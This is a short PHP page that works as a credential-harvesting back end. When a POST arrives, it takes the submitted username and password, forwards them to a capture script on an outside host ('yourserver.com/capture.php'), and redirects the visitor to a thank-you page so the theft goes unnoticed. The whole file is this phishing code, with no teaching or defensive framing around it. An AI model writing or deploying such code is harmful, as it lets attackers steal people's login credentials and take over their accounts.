<html>
  <body>
    <?php
      if ($_SERVER["REQUEST_METHOD"] == "POST") {
        $username = $_POST["username"];
        $password = $_POST["password"];

        $data = array(
          'username' => $username,
          'password' => $password
        );

        $options = array(
          'http' => array(
            'header'  => "Content-type: application/x-www-form-urlencoded\r\n",
            'method'  => 'POST',
            'content' => http_build_query($data),
          ),
        );

        $context  = stream_context_create($options);
        $result = file_get_contents('http://yourserver.com/capture.php', false, $context);

        if ($result === FALSE) {
          /* Handle error */
          echo "Error: " . error_get_last()['message'];
        } else {
          header('Location: thanks.html');
        }
      }
    ?>
  </body>
</html>
